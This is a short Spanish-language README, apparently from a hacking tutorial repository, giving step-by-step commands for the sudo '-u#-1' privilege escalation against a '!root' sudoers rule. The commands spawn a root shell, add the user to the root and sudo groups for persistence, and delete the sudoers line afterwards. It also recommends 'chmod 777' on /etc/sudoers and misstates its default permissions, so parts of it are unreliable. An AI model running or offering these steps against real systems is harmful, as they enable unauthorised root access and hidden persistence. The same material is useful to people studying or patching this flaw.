<img style="float:left" alt="netspy logo" src="https://github.com/hackingyseguridad/sudo/blob/master/sudo.png">

#1.- Por defecto /etc/sudoers tiene permisos chmod 775. Intentamos para editar sin problemas el fichero sudoers $chmod 777 /etc/sudoers  y volvemos a restablecer después los privilegios chmod 755 /etc/sudoers. O Editamos el fichero /etc/sudoers con visudo: 

$usermod -aG sudo antonio

$gpasswd -a antonio sudo

$sudo visudo 

#2.- Añadimos la linea con el usuario antonio 

#User privilege specification

root ALL=(ALL:ALL) ALL

antonio ALL=(ALL) /usr/bin/id

#3.- Ejecutamos: 

$su antonio

$sudo id

$sudo whoani

$sudo -u antonio id

#4.- Volvemos a editar el fichero /etc/sudoers con $sudo visudo

#5.- Modificamos la línea

antonio ALL=(ALL, !root) ALL

#6.- Explotamos la vulnerabilidad con sudo -u#-1

$chmod 755 /etc/sudoers

$sudo -u#-1 /bin/bash

#whoami

root

#7.- ya somos root!

#8.- Otro si: añadimos en la línea sudo de /etc/group a antonio y nos hacernos persistentes en la maquina:

usermod -aG root antonio

usermod -aG sudo antonio

sudo usermod -aG sudo antonio

#9.- Probamos

exit

$sudo antonio

$sudo su

#10.- ya somos del grupo sudo y podemos elevar a root!

Editamos y eliminamos de sudoers la linea
antonio ALL=(ALL, !root) ALL
